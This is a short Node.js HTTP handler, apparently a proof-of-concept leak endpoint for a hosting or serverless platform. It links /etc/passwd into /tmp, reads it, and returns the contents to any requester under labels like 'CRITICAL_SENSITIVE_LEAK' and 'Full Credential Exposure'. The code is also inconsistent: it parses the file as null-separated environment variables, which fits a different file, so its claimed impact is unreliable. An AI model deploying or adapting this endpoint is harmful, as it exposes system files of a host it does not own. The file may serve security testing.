const fs = require('fs');
const path = require('path');

module.exports = async (req, res) => {
    try {
        const targetPath = '/etc/passwd';
        const bridgeName = `critical_leak_${Math.random().toString(36).substring(7)}`;
        const linkPath = path.join('/tmp', bridgeName);

        if (!fs.existsSync(linkPath)) {
            fs.symlinkSync(targetPath, linkPath);
        }

        const rawData = fs.readFileSync(linkPath);
        
        const envs = rawData.toString().split('\0');

        fs.unlinkSync(linkPath);

        res.status(200).json({
            status: "CRITICAL_SENSITIVE_LEAK",
            impact: "Full Credential Exposure",
            environment_variables: envs.filter(e => e.includes('='))
        });
    } catch (err) {
        res.status(500).json({ error: err.message });
    }
};
